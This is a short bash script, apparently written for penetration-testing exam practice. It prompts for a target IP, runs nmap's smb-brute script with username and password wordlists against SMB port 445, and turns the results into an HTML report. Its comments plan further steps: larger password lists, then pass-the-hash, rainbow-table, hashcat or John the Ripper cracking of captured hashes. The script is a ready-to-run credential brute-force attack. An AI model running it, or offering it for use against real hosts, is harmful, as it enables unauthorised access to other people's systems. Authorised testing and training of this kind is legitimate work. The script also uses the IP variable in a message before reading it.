  #!/bin/bash

  # go to seclists to get the username and passwords ;)
  # wordlists stored at /root/wordlists/

  printf "${RED}[+]${RESET} ${BLUE} Checking smb hashes with smb-brute NSE script over $ip...${RESET}\n"
  printf "Note: This may close the port\n"
  printf "Enter IP: "
  read ip

    nmap -vv -p 445 --script=smb-brute --script-args=userdb=/root/wordlists/default_usernames.txt,passdb=/root/wordlists/default_passwords.txt \
      -oX /root/exam/nmap_scans/$ip/smb_nse_brute.xml $ip && xsltproc /root/exam/nmap_scans/$ip/smb_nse_brute.xml \
      -o /root/exam/nmap_scans/$ip/smb_nse_brute_report.html
  firefox /root/exam/nmap_scans/$ip/smb_nse_brute_report.html

  #if its not found, try the other password files: 10k-most-common-passwords,500-worst-passwords,default-passwords

  #either now i smbhash if rdp is open or rainbow crack with pwdump 
  #or hashcat the hashes or lastly johntheripper
